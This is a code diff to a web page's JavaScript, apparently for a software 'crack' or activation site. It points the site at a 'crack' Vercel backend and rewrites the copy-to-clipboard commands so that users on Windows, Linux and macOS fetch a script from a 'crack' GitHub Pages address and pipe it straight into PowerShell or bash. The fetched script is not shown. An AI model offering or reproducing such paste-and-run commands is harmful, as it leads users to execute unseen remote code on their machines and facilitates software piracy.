@@ -2,7 +2,7 @@
 // 自动检测 API 地址：本地开发用当前域名，生产环境用 Vercel 后端
 const API_BASE = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
   ? window.location.origin
-  : 'https://your-project.vercel.app'; // ← 替换为你的 Vercel 域名
+  : 'https://crack-rgipg3end-wangneals-projects.vercel.app';
 const API_URL = `${API_BASE}/api/v1`;
 
 // ===== DOM Elements =====
@@ -45,12 +45,13 @@ function updateDomain() {
 
 // ===== Copy Command =====
 async function copyCommand(os) {
-  const domain = window.location.host;
+  // 使用 GitHub Pages 域名作为激活命令地址
+  const activateDomain = 'verjet01.github.io/crack';
   
   const commands = {
-    windows: `irm ${domain}|iex`,
-    linux: `wget -q ${domain} -O - | bash`,
-    mac: `curl -Ls ${domain} | bash`
+    windows: `irm ${activateDomain}|iex`,
+    linux: `wget -q ${activateDomain} -O - | bash`,
+    mac: `curl -Ls ${activateDomain} | bash`
   };
   
   try {
